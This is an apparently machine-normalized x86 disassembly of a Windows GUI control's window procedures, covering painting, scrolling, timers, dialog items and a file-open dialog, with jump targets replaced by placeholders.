mov ecx [ esi + 0x8 ]
push ecx
mov ecx esi
call sub_40a600
push edi
mov ecx esi
call sub_40a600
xor edx edx
cmp [ ebx ] dx
mov ecx esi
sete dl
push edx
push edi
call sub_40a6e0
mov [ esi + 0x30 ] edi
mov [ esi + 0x8 ] edi
xor eax eax
jmp r-xdata
mov eax [ esp + 0x68 ]
cmp eax 0x9
je r-xdata
push 0x2
push ecx
mov [ esi + 0x50 ] 0x0
call [ KillTimer@IAT ]
call [ ReleaseCapture@IAT ]
movsx edx [ rw-data ]
movsx eax [ rw-data ]
push edx
push eax
mov ecx esi
call sub_40a4d0
xor eax eax
jmp r-xdata
push edi
push ecx
call [ KillTimer@IAT ]
movsx edx [ rw-data ]
push 0x0
push 0x0
push 0x0
push edx
push edi
call [ mouse_event@IAT ]
xor eax eax
cmp [ rw-data ] di
setne al
lea eax [ eax + eax - 0x1 ]
mov [ rw-data ] ax
xor eax eax
jmp r-xdata
push 0x2
push edi
call [ KillTimer@IAT ]
push 0x25
call ebp
movsx edx [ rw-data ]
mov ecx eax
mov eax ebx
shr eax 0x10
sub eax edx
cdq
xor eax edx
sub eax edx
cmp eax ecx
jle r-xdata
jmp [ eax * 4 + jump_table_40ccfc ]
sub eax 0x7534
cmp eax 0x3
ja r-xdata
je r-xdata
mov eax [ esp + 0x60 ]
push edi
push eax
push eax
call [ GetParent@IAT ]
push eax
call [ GetNextDlgTabItem@IAT ]
push eax
call [ SetFocus@IAT ]
xor eax eax
jmp r-xdata
push 0x0
push 0x1
mov eax [ esp + 0x60 ]
push 0x0
push 0x2
push 0x111
push eax
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
xor eax eax
jmp r-xdata
push edi
push 0x0
mov ecx esi
call sub_40b050
xor eax eax
jmp r-xdata
mov ecx [ esi ]
push edi
push ecx
mov ecx esi
call sub_40b050
xor eax eax
jmp r-xdata
test eax eax
mov [ esi + 0x3c ] 0x0
je r-xdata
test eax eax
mov [ esi + 0x3c ] 0x0
je r-xdata
mov ecx [ esi + 0x8 ]
push edi
sub ecx [ esi + 0x2c ]
inc ecx
push ecx
mov ecx esi
call sub_40b050
xor eax eax
jmp r-xdata
mov edx [ esi + 0x2c ]
mov eax [ esi + 0x8 ]
lea ecx [ edx + eax - 0x1 ]
push edi
push ecx
mov ecx esi
call sub_40b050
xor eax eax
jmp r-xdata
push 0x0
push 0x7d3
jmp r-xdata
mov eax [ esp + 0x60 ]
push 0x0
push 0x7d2
push 0x111
push eax
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
xor eax eax
jmp r-xdata
test eax eax
jne r-xdata
mov edx [ esp + 0x60 ]
push 0xffffffff
push 0x0
push 0x204
push edx
call [ SendMessageA@IAT ]
xor eax eax
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
push esi
mov ecx rw-data
call sub_410ea0
xor eax eax
jmp r-xdata
test eax eax
je r-xdata
push esi
mov ecx rw-data
call sub_410ef0
xor eax eax
jmp r-xdata
mov eax [ esp + 0x6c ]
mov ecx [ esp + 0x60 ]
push eax
push edx
push 0x40f
push ecx
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
xor eax eax
jmp r-xdata
mov ecx esi
call sub_40bb50
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov [ esi + 0x18 ] 0x1
push ecx
mov edx [ esi + 0x8 ]
mov [ esi + 0x18 ] 0x0
push edx
jmp r-xdata
mov ebp [ esp + 0x60 ]
lea eax [ esp + 0x10 ]
push eax
push ebp
call [ BeginPaint@IAT ]
mov ecx [ rw-data ]
mov edi eax
push ecx
push edi
call [ SelectObject@IAT ]
mov ebx [ GetSysColor@IAT ]
push 0x5
mov [ esp + 0x64 ] eax
call ebx
push eax
push edi
call [ SetBkColor@IAT ]
push 0x8
call ebx
push eax
push edi
call [ SetTextColor@IAT ]
push 0x1
push edi
call [ SetBkMode@IAT ]
mov eax [ esi + 0x2c ]
xor ebx ebx
test eax eax
jle r-xdata
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jl r-xdata
mov ebp [ esi + 0x2c ]
mov eax 0x88888889
mul ecx
shr edx 0x6
imul edx edx 0xffffff88
mov edi 0x1
sub edi ebp
add ecx edx
mov [ rw-data ] ecx
cmp ecx 0x78
jl r-xdata
mov esi [ esp + 0x60 ]
push 0x0
push 0xfffffff4
push esi
call [ GetWindowLongA@IAT ]
push eax
push 0x111
push esi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
xor eax eax
jmp r-xdata
dec eax
jne r-xdata
cmp ecx [ esi + 0x24 ]
je r-xdata
mov [ esi + 0x48 ] eax
mov [ esi + 0x44 ] ecx
mov [ esi + 0x24 ] ecx
mov al [ rw-data ]
test al al
je r-xdata
mov edx [ esp + 0x6c ]
push edx
push eax
mov eax [ esp + 0x68 ]
push 0x40e
push eax
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
xor eax eax
jmp r-xdata
mov [ esp + 0x68 ] 0x4
jmp r-xdata
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ esi + 0x2c ]
mov eax 0x1
jmp r-xdata
mov eax [ esi + 0x2c ]
dec eax
jmp r-xdata
mov eax [ esi + 0x5c ]
push rw-data
push 0x1
push eax
call [ GetScrollInfo@IAT ]
mov eax [ rw-data ]
mov ecx [ esi + 0x54 ]
jmp [ eax * 4 + jump_table_40cd14 ]
mov ecx esi
call sub_40aca0
jmp r-xdata
cmp eax 0x2726
jg r-xdata
mov al [ rw-data ]
test al al
push edi
je r-xdata
push 0x0
push 0x7d4
jmp r-xdata
mov al [ rw-data ]
test al al
push edi
je r-xdata
push 0x0
push 0x7d5
jmp r-xdata
mov edx [ esp + 0x68 ]
push 0x111
push edx
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
xor eax eax
jmp r-xdata
mov ecx esi
call sub_40aca0
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x60 ]
push eax
push 0x7d1
push 0x111
push ecx
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
xor eax eax
jmp r-xdata
mov edi [ esi + 0x54 ]
mov ebx [ esi + 0x8 ]
push 0x0
push 0x0
mov ecx esi
call sub_40b050
mov edx [ esi ]
push 0x1
dec edx
push edx
mov ecx esi
call sub_40b050
mov ecx esi
mov [ esi + 0x54 ] edi
mov [ esi + 0x8 ] ebx
call sub_40a6b0
mov eax [ esi + 0x5c ]
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
xor eax eax
jmp r-xdata
movzx eax [ esi + 0x58 ]
mov ecx [ esp + 0x60 ]
push eax
push ecx
call sub_416da0
add esp 0x8
xor eax eax
jmp r-xdata
mov ecx esi
call sub_40a600
mov eax [ esp + 0x60 ]
push eax
push edi
call [ SelectObject@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push ebp
call [ EndPaint@IAT ]
xor eax eax
jmp r-xdata
lea esp [ esp ]
mov ecx [ esi + 0x54 ]
mov eax [ esi ]
mov ebx [ esi + 0x2c ]
add edi ecx
sub eax ebx
cmp edi eax
mov [ esi + 0x54 ] edi
jle r-xdata
mov edi [ esi + 0x2c ]
dec edi
lea ebx [ ebx ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jl r-xdata
mov eax 0x88888889
mul ecx
shr edx 0x6
imul edx edx 0xffffff88
mov edi ebx
neg edi
add ecx edx
mov [ rw-data ] ecx
mov edi [ esp + 0x6c ]
push 0x0
lea edx [ esp + 0x70 ]
push edx
push edi
mov ecx esi
call sub_40af50
test [ esp + 0x68 ] 0x4
movzx eax di
jne r-xdata
lea eax [ ebp - 0x1 ]
cdq
idiv [ esi + 0x1c ]
mov edx [ esi + 0x54 ]
mov ecx esi
add eax edx
push eax
call sub_40a600
mov edx [ esi + 0x44 ]
cmp ecx edx
jle r-xdata
mov ecx [ esi + 0x1c ]
mov eax 0x55555556
imul ecx
mov eax edx
shr eax 0x1f
add edx eax
cmp ebp edx
jge r-xdata
push edi
call [ SetFocus@IAT ]
push 0x12
call [ GetKeyState@IAT ]
test ax ax
jl r-xdata
mov edx [ esi + 0x54 ]
mov ebx [ esi + 0x2c ]
lea ecx [ edx + eax ]
mov eax [ esi ]
sub eax ebx
cmp ecx eax
mov [ esi + 0x54 ] ecx
jle r-xdata
sub eax ecx
mov eax [ esi + 0x54 ]
test eax eax
jge r-xdata
mov [ esi + 0x54 ] eax
mov edi [ rw-data ]
push 0xf0
call sub_42991a
add esp 0x4
mov [ esp + 0x60 ] eax
test eax eax
mov [ esp + 0x58 ] 0x0
je r-xdata
mov ecx [ rw-data ]
push ecx
push 0x1
mov ecx esi
call sub_40a2d0
mov ecx [ rw-data ]
call sub_40e4b0
xor eax eax
jmp r-xdata
mov edx [ esp + 0x60 ]
push 0x303
push 0x0
push edx
call sub_411f20
add esp 0xc
test eax eax
je r-xdata
sub eax 0x7531
je r-xdata
je r-xdata
mov ecx [ esi + 0x8 ]
dec ecx
push ecx
mov ecx esi
call sub_40b050
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi + 0x2c ]
inc eax
push eax
mov ecx esi
call sub_40b050
xor eax eax
jmp r-xdata
mov eax [ esi + 0x8 ]
inc eax
push eax
mov ecx esi
call sub_40b050
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ esi + 0x2c ]
lea edx [ eax + ecx - 0x1 ]
push edx
mov ecx esi
call sub_40b050
xor eax eax
jmp r-xdata
mov edx [ esi + 0x54 ]
add edx ebx
push edx
push edi
mov ecx esi
call sub_40acc0
mov eax [ esi + 0x2c ]
inc ebx
cmp ebx eax
jl r-xdata
mov eax [ esi + 0x54 ]
test eax eax
jge r-xdata
mov [ esi + 0x54 ] eax
add ecx 0x78
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
mov [ rw-data ] ecx
mov edi ebx
shr edi 0x10
push edi
push eax
mov ecx esi
call sub_40a4d0
xor eax eax
jmp r-xdata
mov [ esi + 0x34 ] ecx
mov ecx [ esi + 0x48 ]
mov [ esi + 0x38 ] edx
mov [ esi + 0x40 ] ecx
mov [ esi + 0x3c ] eax
mov [ esi + 0x34 ] edx
mov edx [ esi + 0x48 ]
mov [ esi + 0x38 ] ecx
mov [ esi + 0x3c ] edx
mov [ esi + 0x40 ] eax
jmp r-xdata
mov eax [ esi + 0x2c ]
imul ecx eax
sub ecx edx
cmp ebp ecx
jl r-xdata
mov eax [ esi + 0x54 ]
test eax eax
jle r-xdata
cmp edx [ esi + 0x54 ]
je r-xdata
mov [ esi + 0x54 ] 0x0
xor eax eax
push 0x1
push 0x0
push 0x0
mov ecx eax
call sub_4126f0
jmp r-xdata
push eax
push 0x1
mov ecx esi
mov [ rw-data ] eax
call sub_40a2d0
mov ecx [ rw-data ]
call sub_40e4b0
xor eax eax
jmp r-xdata
movzx edx [ esi + 0x58 ]
mov eax [ esp + 0x60 ]
push edx
push eax
call sub_416da0
add esp 0x8
dec eax
jne r-xdata
push esi
mov ecx rw-data
call sub_410ef0
jmp r-xdata
sub eax 0x2722
je r-xdata
cmp ecx [ esi + 0x54 ]
jne r-xdata
mov [ esi + 0x54 ] 0x0
add ecx 0x78
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
jmp r-xdata
mov [ esi + 0x3c ] 0x0
mov edx [ esi + 0x3c ]
cmp edx [ esi + 0x40 ]
jne r-xdata
mov ecx [ esi ]
sub ecx eax
cmp [ esi + 0x54 ] ecx
jge r-xdata
xor eax eax
jmp r-xdata
mov ecx esi
call sub_40a6b0
mov ecx [ esi + 0x5c ]
push 0x0
push 0x0
push ecx
call [ InvalidateRect@IAT ]
xor eax eax
jmp r-xdata
push eax
push 0x1
mov ecx esi
mov [ esp + 0x60 ] 0xffffffff
mov [ rw-data ] eax
call sub_40a2d0
mov ecx edi
call sub_4113e0
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x60 ]
push ecx
mov ecx rw-data
call sub_40d9b0
mov ecx eax
call sub_40f040
sub eax 0x2
jne r-xdata
xor eax eax
jmp r-xdata
mov eax 0x1
mov edi [ esp + 0x60 ]
push 0x0
push eax
push 0x115
push edi
mov ecx esi
call sub_40be80
push edi
call [ UpdateWindow@IAT ]
movsx edx [ rw-data ]
push 0x0
push edx
push 0x1
push edi
call [ SetTimer@IAT ]
push 0x2
push edi
call [ KillTimer@IAT ]
xor eax eax
jmp r-xdata
push esi
mov ecx rw-data
call sub_410ea0
jmp r-xdata
sub_40cd40
mov edx [ ecx ]
test edx edx
je r-xdata
retn 0x4
push esi
mov esi [ esp + 0x8 ]
mov al [ esi + 0x48 ]
test al al
je r-xdata
mov eax [ ecx + 0x8 ]
dec eax
mov [ ecx + 0x8 ] eax
js r-xdata
push esi
call sub_40ba50
pop esi
retn 0x4
push 0x0
push edx
mov ecx esi
call sub_40a160
mov ecx esi
call sub_40ea70
pop esi
mov ecx [ ecx + 0xc ]
lea eax [ ecx + eax * 2 ]
movsx ecx [ eax ]
movsx eax [ eax + 0x2 ]
sub eax ecx
lea ecx [ edx + ecx * 2 ]
push eax
push ecx
mov ecx esi
call sub_40a160
pop esi
retn 0x4
sub_40cda0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_431c8b
push eax
mov [ fs : 0x0 ] esp
sub esp 0x84
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0xa4 ]
push 0x0
push edi
call [ GetWindowLongA@IAT ]
mov ecx [ esp + 0xac ]
mov esi eax
mov eax [ esp + 0xa8 ]
cmp eax 0x113
ja r-xdata
cmp eax 0x408
ja r-xdata
je r-xdata
mov ecx eax
sub ecx 0x409
je r-xdata
je r-xdata
cmp ecx 0x2
jne r-xdata
cmp eax 0xf
ja r-xdata
mov eax [ esi + 0x4c ]
mov ecx [ esi + 0x10 ]
test ecx ecx
mov edi [ eax + 0x10 ]
mov ebx [ eax + 0x18 ]
je r-xdata
sub ecx 0x8
je r-xdata
mov ecx [ esp + 0xac ]
mov edx [ esp + 0xb0 ]
push ecx
push edx
mov ecx esi
call sub_40a160
xor eax eax
jmp r-xdata
cmp eax 0x402
ja r-xdata
xor eax eax
jmp r-xdata
mov edx [ esp + 0xb0 ]
push edx
push ecx
push eax
mov ecx esi
call sub_410230
xor eax eax
jmp r-xdata
lea ecx [ eax - 0x87 ]
cmp ecx 0x8a
ja r-xdata
je r-xdata
mov edx [ esp + 0xb0 ]
mov [ edx ] edi
mov eax ebx
push ebx
push edi
call sub_40b430
mov eax [ esp + 0xb0 ]
mov [ esi + 0x10 ] eax
mov eax [ esp + 0xac ]
test eax eax
je r-xdata
dec ecx
je r-xdata
mov ecx [ esp + 0x94 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x90
retn 0x10
cmp eax 0x405
jne r-xdata
je r-xdata
mov ecx [ esp + 0xb0 ]
mov edx [ esp + 0xac ]
push ecx
push edx
push eax
push edi
call [ DefWindowProcA@IAT ]
jmp r-xdata
movzx ecx [ ecx + lookup_table_40d2e0 ]
jmp [ ecx * 4 + jump_table_40d2cc ]
lea ecx [ esp + 0x54 ]
push ecx
push edi
call [ BeginPaint@IAT ]
lea edx [ esp + 0x44 ]
push edx
push edi
mov ebx eax
call [ GetClientRect@IAT ]
push 0x5
call [ GetSysColorBrush@IAT ]
push eax
lea eax [ esp + 0x48 ]
push eax
push ebx
call [ FillRect@IAT ]
mov ebp [ GetSysColor@IAT ]
push 0x5
call ebp
push eax
push ebx
call [ SetBkColor@IAT ]
push 0x8
call ebp
push eax
push ebx
call [ SetTextColor@IAT ]
lea ecx [ esp + 0x5c ]
push ecx
push ebx
mov ecx esi
call sub_40ea90
lea edx [ esp + 0x54 ]
push edx
push edi
call [ EndPaint@IAT ]
xor eax eax
jmp r-xdata
lea ecx [ eax - 0x1 ]
cmp ecx 0x7
ja r-xdata
xor eax eax
jmp r-xdata
mov ebp [ GetParent@IAT ]
push eax
push edi
call ebp
push eax
call [ GetDlgItem@IAT ]
mov ebx [ GetWindowRect@IAT ]
lea ecx [ esp + 0x20 ]
mov esi eax
push ecx
push esi
call ebx
lea edx [ esp + 0x10 ]
push edx
push edi
call ebx
lea eax [ esp + 0x34 ]
push eax
push edi
call ebp
push eax
call ebx
mov edi [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x28 ]
mov eax [ esp + 0x20 ]
push 0x1
sub ecx edi
mov edi [ GetSystemMetrics@IAT ]
sub edx eax
push ecx
inc edx
push edx
push 0x4
call edi
mov ebx [ esp + 0x30 ]
sub ebx [ esp + 0x44 ]
push 0x2e
sub ebx eax
call edi
sub ebx eax
dec ebx
push ebx
push 0x2d
call edi
mov ecx [ esp + 0x28 ]
sub ecx [ esp + 0x44 ]
sub ecx eax
dec ecx
push ecx
push esi
call [ MoveWindow@IAT ]
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0xb0 ]
push eax
mov ecx esi
call sub_40ab10
jmp r-xdata
mov eax esi
jmp r-xdata
cmp eax 0x200
jb r-xdata
mov eax [ esp + 0xac ]
cmp eax 0x9
je r-xdata
mov eax 0x85
jmp r-xdata
mov ebx [ GetKeyState@IAT ]
push 0x10
call ebx
xor edx edx
test ax ax
setl dl
push 0x11
mov ebp edx
call ebx
mov edx [ esp + 0xac ]
xor ecx ecx
test ax ax
setl cl
mov eax ecx
lea ecx [ edx - 0x9 ]
cmp ecx 0x7d
ja r-xdata
mov edx [ esp + 0xac ]
push edx
mov ecx esi
call sub_427970
jmp [ ecx * 4 + jump_table_40d2ac ]
push edi
call [ SetFocus@IAT ]
xor eax eax
jmp r-xdata
push esi
call sub_40ba50
cmp eax 0x204
jbe r-xdata
xor eax eax
jmp r-xdata
push eax
mov ecx esi
call sub_417d20
xor eax eax
jmp r-xdata
push ebp
push eax
push edx
mov ecx esi
call sub_40f360
xor eax eax
jmp r-xdata
movzx ecx [ ecx + lookup_table_40d38c ]
jmp [ ecx * 4 + jump_table_40d36c ]
push 0x1
push 0x2e
call [ GetSystemMetrics@IAT ]
movsx ecx [ rw-data ]
movsx edx [ rw-data ]
add eax ecx
lea eax [ edx + eax * 2 ]
push eax
mov eax [ esp + 0xb8 ]
mov ecx [ eax + 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ eax + 0x1c ]
push ecx
push edx
push eax
push edi
call [ MoveWindow@IAT ]
push 0xf0
call sub_42991a
add esp 0x4
mov [ esp + 0x30 ] eax
test eax eax
mov [ esp + 0x9c ] 0x0
je r-xdata
push esi
mov ecx rw-data
call sub_40d9e0
test esi esi
je r-xdata
push 0x1
push 0x1
push 0x41
mov ecx esi
call sub_40f360
mov ecx esi
call sub_40db90
push esi
mov ecx rw-data
call sub_40e8d0
xor eax eax
jmp r-xdata
mov ecx rw-data
call sub_402620
call [ DestroyCaret@IAT ]
xor eax eax
jmp r-xdata
cmp eax 0x286
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
test eax eax
jne r-xdata
cmp [ esi + 0x44 ] 0x2
jne r-xdata
mov ecx rw-data
call sub_402620
push 0x0
push 0x2
push 0xffffffff
push 0x0
push 0x204
mov ecx esi
call sub_410230
xor eax eax
jmp r-xdata
xor eax eax
push eax
push eax
push edi
call [ SetWindowLongA@IAT ]
xor eax eax
jmp r-xdata
push edi
mov ecx eax
call sub_40a090
push eax
push 0x0
push edi
call [ SetWindowLongA@IAT ]
xor eax eax
jmp r-xdata
mov ecx esi
call sub_40e960
push esi
call j_sub_429931
add esp 0x4
xor eax eax
jmp r-xdata
push edi
call [ IsWindowUnicode@IAT ]
push eax
mov eax [ esp + 0xb0 ]
push eax
mov ecx esi
call sub_40e150
xor eax eax
jmp r-xdata
push ebp
push edi
push edi
call [ GetParent@IAT ]
push eax
call [ GetNextDlgTabItem@IAT ]
push eax
call [ SetFocus@IAT ]
xor eax eax
jmp r-xdata
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
mov ecx rw-data
call sub_402620
push 0x0
push 0x3e7
jmp r-xdata
push 0x0
mov ecx esi
call sub_403e90
push esi
call sub_40b650
xor eax eax
jmp r-xdata
push esi
call sub_40cd40
xor eax eax
jmp r-xdata
push 0x111
push edi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
sub_40d394
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add al [ edi ]
pop es
pop es
pop es
pop es
add eax [ ebx ]
pop es
pop es
pop es
add al 0x7
add eax 0x7070707
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
push es
nop
nop
nop
nop
nop
nop
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ esp + 0x10 ]
cmp edi 0x100
jne r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0xc ]
push ecx
push esi
push edi
push eax
call sub_40cda0
pop edi
pop esi
retn 0x10
cmp esi 0xd
je r-xdata
mov eax [ esp + 0xc ]
push eax
call [ GetParent@IAT ]
mov ecx [ esp + 0x18 ]
push ecx
push esi
push edi
push eax
call sub_40cda0
pop edi
pop esi
retn 0x10
cmp esi 0x1b
jne r-xdata
sub_40d460
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
push 0x0
push esi
call [ GetWindowLongA@IAT ]
mov ebx [ esp + 0x14 ]
mov edi eax
mov eax ebx
dec eax
je r-xdata
push 0x6c
call sub_42991a
add esp 0x4
test eax eax
je r-xdata
dec eax
je r-xdata
xor eax eax
push esi
mov ecx eax
call sub_40a1d0
jmp r-xdata
test edi edi
je r-xdata
sub eax 0x85
jne r-xdata
push eax
push 0x0
push esi
mov edi eax
call [ SetWindowLongA@IAT ]
push 0x0
push esi
call ImmAssociateContext
pop edi
pop esi
xor eax eax
pop ebx
retn 0x10
mov ecx edi
call sub_40a200
push edi
call j_sub_429931
add esp 0x4
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x18 ]
push eax
push ecx
push ebx
push esi
mov ecx edi
call sub_40be80
pop edi
pop esi
pop ebx
retn 0x10
pop edi
pop esi
mov eax 0x85
pop ebx
retn 0x10
sub_40d500
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ RegisterClassA@IAT ]
push esi
mov [ esi + 0x1c ] 0x6
mov [ esi ] 0xb
mov [ esi + 0x4 ] sub_40cda0
mov [ esi + 0x24 ] r--data
call edi
test ax ax
jne r-xdata
push esi
mov [ esi ] 0xb
mov [ esi + 0x4 ] r-xdata
mov [ esi + 0x24 ] r--data
call edi
test ax ax
je r-xdata
pop edi
mov eax 0x1
pop esi
retn
push esi
mov [ esi ] 0xb
mov [ esi + 0x4 ] sub_40d460
mov [ esi + 0x24 ] r--data
call edi
neg ax
pop edi
pop esi
sbb eax eax
inc eax
retn
sub_40d580
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xa24
push ebx
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
movzx eax cx
push edi
mov edi [ esi + 0xc ]
mov ebx [ edi + 0x8 ]
add eax 0xfffff830
cmp eax 0x9
ja r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ecx + 0x8 ]
mov edi [ ecx ]
push edx
call sub_40ac60
mov ebx [ GetDlgItem@IAT ]
push edi
mov [ esp + 0x10 ] eax
mov eax [ esi + 0x214 ]
push 0x7d2
push eax
call ebx
push eax
call [ EnableWindow@IAT ]
mov ecx [ esi + 0x214 ]
push edi
push 0x7d3
push ecx
call ebx
push eax
call [ EnableWindow@IAT ]
mov eax [ esp + 0xc ]
xor edx edx
test eax eax
mov eax [ esi + 0x214 ]
setg dl
push edx
push 0x7d4
push eax
call ebx
push eax
call [ EnableWindow@IAT ]
mov ecx [ esp + 0xc ]
push ecx
mov ecx [ esi + 0xc ]
call sub_40a490
xor edx edx
cmp eax edi
mov eax [ esi + 0x214 ]
setl dl
push edx
push 0x7d5
push eax
call ebx
push eax
call [ EnableWindow@IAT ]
jmp [ eax * 4 + jump_table_40d8e0 ]
shr ecx 0x10
test ecx ecx
jne r-xdata
cmp cx 0x7d2
jne r-xdata
push ebx
mov ecx edi
mov [ esi + 0x21e ] 0x1
call sub_40be40
mov ecx [ esi + 0xc ]
push 0x0
push eax
call sub_40b050
jmp r-xdata
push ebx
mov ecx edi
mov [ esi + 0x21e ] 0x1
call sub_40ac60
mov ebx eax
lea edx [ ebx - 0x1 ]
push edx
mov ecx edi
call sub_40ac60
push ebx
mov ecx edi
mov [ esi + 0x21e ] 0x1
call sub_40a490
push eax
mov ecx edi
call sub_40a490
jmp r-xdata
push edi
mov ecx rw-data
call sub_410ef0
jmp r-xdata
push edi
mov ecx rw-data
call sub_410ea0
jmp r-xdata
push 0x0
push 0x0
mov ecx edi
call sub_40a2d0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov ecx 0x13
lea edi [ esp + 0x10 ]
[ edi ]
mov ecx 0x80
lea edi [ esp + 0x60 ]
[ edi ]
mov ecx [ rw-data ]
push 0x200
lea eax [ esp + 0x64 ]
push eax
push 0x78
push ecx
call [ LoadStringA@IAT ]
lea edx [ esi + 0x624 ]
push edx
lea eax [ esp + 0x64 ]
push eax
call [ lstrcatA@IAT ]
mov cl [ esp + 0x60 ]
test cl cl
lea eax [ esp + 0x60 ]
je r-xdata
mov [ ebp + 0x8 ] 0x7d2
jmp r-xdata
push ebx
mov ecx edi
mov [ esi + 0x218 ] 0x0
call sub_40a490
mov ebx eax
push ebx
mov ecx edi
call sub_40ac60
mov ebx eax
push ebx
mov ecx esi
call sub_402170
jmp r-xdata
push eax
push ebx
mov ecx edi
mov edx [ rw-data ]
mov ecx [ esi + 0x214 ]
mov [ esp + 0x18 ] edx
mov [ esp + 0x14 ] ecx
lea edx [ esp + 0x10 ]
lea eax [ esp + 0x60 ]
lea ecx [ esp + 0x260 ]
push edx
mov [ esp + 0x14 ] 0x4c
mov [ esp + 0x20 ] eax
mov [ esp + 0x2c ] 0x2
mov [ esp + 0x30 ] ecx
mov [ esp + 0x34 ] 0x7d0
mov [ esp + 0x48 ] 0x81a04
mov [ esp + 0x264 ] 0x0
call [ GetOpenFileNameA@IAT ]
test eax eax
je r-xdata
cmp [ eax ] 0x9
jne r-xdata
cmp [ ebp + 0x8 ] 0x7d2
mov [ esi + 0x21e ] 0x1
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ esp + 0x260 ]
push eax
call [ lstrlenA@IAT ]
lea edi [ esp + eax + 0x261 ]
mov ebx 0x1
mov edi edi
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov [ eax ] 0x0
test ebx ebx
jge r-xdata
mov ecx [ esi + 0xc ]
push ebx
call sub_40be40
mov ebx eax
lea ecx [ esp + 0x260 ]
push ecx
lea edx [ esp + 0x64 ]
push edx
xor ebx ebx
call [ lstrcpyA@IAT ]
lea eax [ esp + 0x60 ]
push edi
push eax
call sub_420a00
add esp 0x8
lea ecx [ esp + 0x60 ]
push ecx
mov ecx esi
mov edi eax
call sub_40a040
jmp r-xdata
test ebx ebx
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ ecx ]
lea edi [ esi + 0x4 ]
mov ecx edi
mov [ esp + 0xc ] edx
call sub_40bad0
mov ax [ esi + 0x21c ]
test ax ax
je r-xdata
xor ebx ebx
cmp [ edi ] 0x0
jne r-xdata
movsx eax [ esi + 0x21c ]
mov edx [ esi + 0x218 ]
sub edx eax
push edx
lea eax [ esi + eax * 2 + 0x224 ]
push eax
mov ecx edi
call sub_40b820
push 0xffffffff
mov ecx edi
call sub_40b700
mov ecx [ esp + 0xc ]
push ebx
push ecx
mov ecx [ esi + 0xc ]
jmp r-xdata
movsx eax ax
push eax
lea ecx [ esi + 0x224 ]
push ecx
mov ecx edi
call sub_40b820
push 0xffffffff
mov ecx edi
call sub_40b700
call sub_40b1e0
sub_40d910
push esi
push edi
mov edi [ esp + 0xc ]
push 0x0
push 0x0
push 0x402
mov esi ecx
push 0x7d0
push edi
mov [ esi + 0x214 ] edi
mov [ esi + 0x21c ] 0x0
call [ SendDlgItemMessageA@IAT ]
mov ecx [ esp + 0x14 ]
mov [ esi + 0xc ] eax
push 0x40
lea eax [ esi + 0x624 ]
push eax
mov [ esi + 0x21e ] 0x0
mov edx [ rw-data ]
push ecx
push edx
call [ LoadStringA@IAT ]
push 0x7d0
push edi
call [ GetDlgItem@IAT ]
push eax
lea ecx [ esi + 0x4 ]
call sub_40aa30
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax [ esi + 0xc ]
push 0x0
mov [ eax + 0xc ] 0x1
mov ecx [ esi + 0xc ]
push 0x0
call sub_40b050
push 0x0
mov ecx esi
